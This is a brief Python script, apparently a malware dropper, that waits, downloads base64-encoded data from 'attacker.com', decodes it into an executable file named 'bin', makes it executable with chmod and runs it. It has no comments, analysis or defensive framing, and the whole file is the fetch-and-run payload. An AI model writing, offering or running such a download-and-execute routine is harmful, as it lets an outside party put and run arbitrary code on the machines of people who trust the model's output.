import base64
import os
import time
import requests
time.sleep(5)
req=requests.get('http://attacker.com/b64')

b64=req.content
decoded=base64.decodebytes(b64)
with open("bin","wb") as out :
	out.write(decoded)
	out.close()
os.system('chmod +x bin')
time.sleep(1)
os.system('./bin > x.maleware')
